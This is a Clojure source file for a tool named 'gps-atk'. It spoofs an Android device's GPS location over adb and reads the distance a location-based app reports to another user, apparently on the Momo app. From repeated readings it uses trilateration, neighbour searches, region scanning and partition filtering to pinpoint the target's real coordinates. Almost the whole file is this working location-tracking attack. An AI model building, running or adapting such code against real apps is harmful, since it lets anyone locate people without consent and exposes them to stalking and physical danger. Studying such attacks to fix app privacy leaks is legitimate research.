(ns gps-atk.core
  (:gen-class :main true)
;  (:gen-class :main true)
  (:use [gps-atk.debug])
  (:require [gps_atk.telnet :as telnet]
            [gps-atk.server :as server]
            [gps_atk.actions :as actions]
            [gps_atk.dsl :as dsl]
            [gps-atk.device :as device]
            [gps-atk.lib.min-coord :as mc]
            [gps-atk.lib.filter-atk :as fatk]
            [gps-atk.lib.coords :as co]
            [gps-atk.utils :as utils]
            [clojure.string :as string]))

(defn- get-distance [env conf]
  (try
    (:distance (device/eval-op-seq (:fetch conf) env))
    (catch IllegalArgumentException e
      (log-exception e)
      nil)))

(defn new-point-read [point conf & {:keys [retry] :or {retry 0}}]
  (apply actions/send-location (get conf :service :device)
         (conj ((get conf :send-coord identity) point) conf))
  (let [timestamp (device/eval-op-seq (:refresh conf) conf)]
    (or (log-info (get-distance (assoc conf :timestamp timestamp) conf))
        (and (< retry (get conf :fetch-retry -1))
             (do (log-info (str "Retry: " retry))
                 (log-info (str "Force Refresh: "
                                (get-distance (assoc conf :timestamp timestamp)
                                              conf))) ; Force Refresh
                 (when-let [recover (:recover conf)]
                   (device/eval-op-seq recover conf))
                 (new-point-read point conf :retry (inc retry))))
        (when (:fetch-retry conf)
          (throw (Exception. "Maximum Retry Exceeded!"))))))

(defn- get-delta-dist [state]
  (let [[a b c] (take 3 (:ests state))]
    (- (:dist c) (:dist a))))

(defn- min-est [state]
  (-> state :ests first :dist))

(defn- min-coord [state]
  (-> state :ests first :coord))

(defn- trilateration-min-precision? [state]
  (log-info "Trilateration test!")
  (log-info state)
  (<= (min-est state) (:triloc-min (:conf state))))

(defn- make-coords [conf lat-longs]
  (map (fn [coord] {:coord coord :dist (new-point-read coord conf)
                    :time (utils/timestamp)}) lat-longs))

(defn- sort-coords [coords]
  (sort #(or (and (= (:dist %1) (:dist %2)) (< (:time %1) (:time %2)))
             (< (:dist %1) (:dist %2))) coords))

(defn- neighbor-points [coord radius & direct-8]
  (mapcat (fn [rad]
            (let [[x y zone zone-letter] (apply co/ll->utmxy coord)]
              (map (fn [[x y]] (co/utmxy->ll x y zone zone-letter))
                   (concat [[(+ x rad) y]
                            [x (+ y rad)]]
                           (and direct-8
                                [[(+ x (* rad 0.707)) (+ y (* rad 0.707))]
                                 [(+ x (* rad 0.707)) (- y (* rad 0.707))]])))))
          [radius (- radius)]))

(defn- push-local-tries [{:keys [conf] :as state}]
  (log-info "Local moves!")
  (update-in state [:ests]
             #(->> (concat
                    (neighbor-points (min-coord state)
                                     (-> state min-est (* 0.5)) true)
                    (neighbor-points (min-coord state)
                                     (-> state min-est) true))
                   utils/seq1
                   (make-coords conf)
                   (filter (fn [{:keys [coord dist]}]
                             (< dist (min-est state))))
                   first
                   (conj %)
                   sort-coords)))

(defn- make-region-points [[lat1 lng1] [lat2 lng2] step]
  (let [step-lat (-> lat2 (- lat1) Math/signum (* step))
        step-lng (-> lng2 (- lng1) Math/signum (* step))]
    (for [x (range lat1 lat2 step-lat) y (range lng1 lng2 step-lng)]
      [x y])))

(dsl/defstate :momo-start {:keys [conf] :as state}
  (log-info state)
  (assoc state
    :ests (->> (repeatedly 3 co/generate-lat-long)
               (:est-seq conf)
               (make-coords conf)
               sort-coords)
    :cur :momo-iter))

(dsl/defstate :momo-scan {:keys [conf cur-point region-points] :as state}
  (log-info state)
  (if cur-point
    (let [dist (new-point-read cur-point conf)]
      (if (and dist (< dist (:triloc-min conf)))
        (assoc state :cur :momo-filter :possible {:x 1 :y 1}
               :center cur-point
               :radius dist
               :dim :x)
        (if-let [next-point (first region-points)]
          (assoc state :cur-point next-point :region-points (rest region-points))
          (throw (Exception. "Unable to find point!")))))
    (let [rps (:est-seq conf (make-region-points (:left-top state)
                                                 (:right-bottom state)
                                                 (:step-value state)))]
      (assoc state :cur-point (first rps) :region-points (rest rps)))))

(dsl/defstate :momo-iter {:keys [conf] :as state}
;  (prn "CONF:" *conf*)
  (if (trilateration-min-precision? state)
    (or (and (:partition conf)
             (assoc state :cur :momo-filter :possible {:x 1 :y 1}
                    :center (:coord (first (:ests state)))
                    :radius (or (and (:shrink-radius conf) (min-est state))
                                (:triloc-min conf))
                    :dim :x))
        (assoc state :cur :done :result (min-coord state)))
    (let [points (take 3 (:ests state))
          coord (mc/least-square-position points)
          latest-pt (apply (comp :time max-key) :time points)]
      (if (or (<= (get-delta-dist state) (:threshold state))
              (some #(< latest-pt (:time %1)) (drop 3 (:ests state))))
        (push-local-tries state)
        (with-exception-debug true e
          (assoc state :ests (sort-coords
                              (conj (:ests state)
                                    {:coord coord
                                     :dist (new-point-read coord conf)
                                     :time (utils/timestamp)})))
          (do (log-error "[Iter] Exception Caught! Retry!") state))))))

(dsl/defstate :momo-filter {:keys [conf] :as state}
  (log-info state)
  (if (every? (partial < (:max-level conf 64)) [(get-in state [:possible :x])
                              (get-in state [:possible :y])])
    (assoc state :cur :done :result (:center state))
    (let [{:keys [center dim radius possible]} state
          test-point (fatk/get-test-point center dim radius)]
      (with-exception-debug true e
        (let [[new-center new-dim] (fatk/recenter center dim radius
                                                  ((fnil <= (:read-not-found conf))
                                                   (new-point-read test-point conf) radius)
                                                  (* (get conf :multiplier 2)
                                                     (dim possible)))
              new-state (update-in (assoc state :center new-center
                                          :dim new-dim)
                                   [:possible dim]
                                   #(* (get conf :multiplier 2) %))]
          (if-let [new-radius (and (:shrink-radius conf)
                                   (< radius (:triloc-min conf))
                                   (> radius (:min-radius conf))
                                   (new-point-read new-center conf))]
            (or (and (< new-radius radius)
                     (assoc new-state :possible {:x 1 :y 1}
                            :dim :x :radius new-radius))
                new-state)
            new-state))
        (do (log-error "[Filter] Exception Caught! Retry!")
            (.printStackTrace e)
            state)))))

(dsl/defstate :done state
  (log-info state)
  (:result state))

(defn start-attack
  "Start the attack"
  [{:keys [init-state] :or {init-state :momo-start} :as conf}]
  (dsl/start init-state (assoc (:start-state conf)
                           :conf
                           (assoc conf :pid (-> conf :app-string
                                                device/get-pid)))))

(defn prepare-device! [conf]
  ;; (when (:telnet conf)
  ;;   (telnet/telnet-connect! (:host (:telnet conf)) (:port (:telnet conf))))
  (when (:location-service-port conf)
    (server/run-location-service! conf))
  (apply device/adb-get-device! (:device conf)))

(defn -main [config-file]
  (let [conf (load-file config-file)]
    (prepare-device! conf)
    (start-attack conf)))
